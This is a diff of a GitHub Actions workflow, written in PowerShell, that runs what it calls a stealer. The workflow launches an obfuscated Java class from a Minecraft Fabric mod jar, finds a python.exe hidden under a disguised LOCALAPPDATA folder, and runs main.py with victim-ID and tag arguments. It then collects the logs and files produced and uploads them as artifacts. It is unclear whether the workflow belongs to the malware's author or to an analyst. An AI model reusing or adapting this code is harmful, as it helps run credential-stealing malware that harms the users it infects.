@@ -32,25 +32,27 @@ jobs:
           $ctx = @{ userId = "$env:UID_"; tag = "$env:TAG_"; domain = "$env:DOM_"; env = "Fabric"; gameDir = "$d\mc"; mcInfo = "{}" } | ConvertTo-Json -Compress
           $b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($ctx))
           $p = Start-Process java -ArgumentList "-cp","agent\mod.jar","net.fabric.taxjHfh",$b64 -RedirectStandardOutput "$d\run.log" -RedirectStandardError "$d\run.err" -PassThru
-          Start-Sleep -Seconds 60
-          "--- launcher log ---"
+          Start-Sleep -Seconds 45
           Get-Content "$d\run.log" -Raw
           Get-Content "$d\run.err" -Raw
+          $py = Get-ChildItem "$env:LOCALAPPDATA" -Recurse -Filter python.exe -ErrorAction SilentlyContinue | Select-Object -First 1
+          if ($py) { "FOUND=" + $py.FullName; $py.FullName | Set-Content "$d\py.txt" } else { "NO PYTHON" }
+          Get-ChildItem $env:LOCALAPPDATA -Recurse -Filter "*.log" -ErrorAction SilentlyContinue | Select-Object -First 10 FullName | Out-String | Write-Output
       - name: Run stealer directly
+        if: always()
         shell: powershell
         env:
           UID_: "80618e74-3f82-4aa6-b6e3-510587905f36"
           TAG_: ${{ inputs.tag }}
-          DOM_: ${{ inputs.domain }}
         run: |
           $d = "$env:RUNNER_TEMP\sn"
-          $rt = "$env:LOCALAPPDATA\Microsoft\Windows\NtProfileIndex\AppHost"
-          "rt=$rt"
-          Get-ChildItem $rt | Select-Object -First 5 Name
-          $env:SN_DOMAIN = "$env:DOM_"
-          & "$rt\python.exe" "$rt\main.py" -u "$env:UID_" --env Fabric --tag "$env:TAG_" --mcInfo "{}" --prefireId "" 2>&1 | Tee-Object "$d\stealer.log"
+          $py = Get-Content "$d\py.txt" -ErrorAction SilentlyContinue
+          if (-not $py) { "no python path"; exit 0 }
+          $rt = Split-Path $py
+          & $py "$rt\main.py" -u "$env:UID_" --env Fabric --tag "$env:TAG_" --mcInfo "{}" --prefireId "" 2>&1 | Tee-Object "$d\stealer.log"
           "exit=$LASTEXITCODE"
-          Get-ChildItem "$d\mc" -Recurse | Select FullName,Length
+          Start-Sleep 30
+          Get-ChildItem "$d" -Recurse | Select-Object FullName,Length | Out-String | Write-Output
       - uses: actions/upload-artifact@v4
         if: always()
         with:
